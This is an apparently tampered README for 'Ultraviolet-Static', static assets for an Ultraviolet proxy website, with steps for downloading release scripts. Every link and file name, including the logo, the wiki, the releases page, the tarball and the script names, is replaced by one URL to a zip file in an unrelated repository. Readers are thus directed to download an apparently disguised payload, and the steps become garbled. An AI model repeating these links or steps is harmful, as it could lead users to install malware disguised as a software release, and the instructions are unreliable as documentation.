<p align="center"><img src="https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip" height="200"></p>

<h1 align="center">Ultraviolet-Static</h1>

Static files/assets used to spin up an Ultraviolet website.

## Install in [Ultraviolet-App](https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip)

See [Ultraviolet-App's Wiki](https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip).

## Usage outside of Ultraviolet-App/Static hosting

### Ultraviolet scripts

This repository doesn't serve any Ultraviolet scripts. It has a `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip` to show how Ultraviolet is intended to work with this demo. Ultraviolet-App automatically merges our `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip` with the remaining UV scripts (`https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip`, `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip`, etc). **Some work has to be done in order to make this repository standalone.**

Here's how to get the remaining scripts for the purpose of hosting this repository:

1. Go to the [Ultraviolet releases](https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip)
2. Find the latest release
3. Download the latest tarball (eg. `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip`)
4. Open the tarball, navigate to the `dist` directory, and extract all the scripts with the exception of `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip` (we already have a configuration) into the `public/uv/` directory in this repository.
   You may see `.map` files. These are used for debugging. If they're too large, you can omit them without any errors.

   Do not copy `https://github.com/BreadStisx/Biologys/raw/refs/heads/main/public/uv/Software_proctorially.zip` from the archive!

